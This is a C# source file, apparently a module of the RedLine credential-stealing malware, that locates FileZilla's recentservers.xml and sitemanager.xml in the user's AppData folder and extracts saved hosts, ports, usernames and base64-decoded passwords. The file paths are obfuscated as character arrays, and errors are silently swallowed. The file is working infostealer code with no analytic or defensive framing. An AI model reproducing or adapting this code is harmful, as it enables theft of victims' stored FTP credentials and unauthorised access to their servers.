using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class FileZilla
{
	public static List<LoginPair> ParseConnections()
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			string path = string.Format(new string(new char[31]
			{
				'{', '0', '}', '\\', 'F', 'i', 'l', 'e', 'Z', 'i',
				'l', 'l', 'a', '\\', 'r', 'e', 'c', 'e', 'n', 't',
				's', 'e', 'r', 'v', 'e', 'r', 's', '.', 'x', 'm',
				'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			string path2 = string.Format(new string(new char[29]
			{
				'{', '0', '}', '\\', 'F', 'i', 'l', 'e', 'Z', 'i',
				'l', 'l', 'a', '\\', 's', 'i', 't', 'e', 'm', 'a',
				'n', 'a', 'g', 'e', 'r', '.', 'x', 'm', 'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			if (File.Exists(path))
			{
				list.AddRange(ParseCredentials(path));
			}
			if (File.Exists(path2))
			{
				list.AddRange(ParseCredentials(path2));
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static List<LoginPair> ParseCredentials(string Path)
	{
		List<LoginPair> list = new List<LoginPair>();
		try
		{
			XmlTextReader reader = new XmlTextReader(Path);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(reader);
			foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes[0]!.ChildNodes)
			{
				LoginPair loginPair = ParseRecent(childNode);
				if (loginPair.Login != "UNKNOWN" && loginPair.Host != "UNKNOWN")
				{
					list.Add(loginPair);
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static LoginPair ParseRecent(XmlNode xmlNode)
	{
		LoginPair loginPair = new LoginPair();
		try
		{
			foreach (XmlNode childNode in xmlNode.ChildNodes)
			{
				if (childNode.Name == "Host")
				{
					loginPair.Host = childNode.InnerText;
				}
				if (childNode.Name == "Port")
				{
					loginPair.Host = loginPair.Host + ":" + childNode.InnerText;
				}
				if (childNode.Name == "User")
				{
					loginPair.Login = childNode.InnerText;
				}
				if (childNode.Name == "Pass")
				{
					loginPair.Password = CryptoHelper.Base64Decode(childNode.InnerText);
				}
			}
		}
		catch
		{
		}
		finally
		{
			loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
			loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
			loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
		}
		return loginPair;
	}
}
